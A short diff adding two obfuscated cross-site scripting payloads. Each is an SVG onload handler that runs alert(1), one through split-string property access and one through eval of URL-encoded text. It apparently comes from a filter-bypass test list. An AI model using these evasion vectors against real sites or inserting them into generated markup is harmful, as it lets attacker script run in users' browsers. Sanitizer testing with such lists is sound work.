@@ -1,0 +1,2 @@
+<svg onload='window["al"+"ert"](1)'>
+<svg onload='eval(unescape("%61%6c%65%72%74%28%31%29"))'>
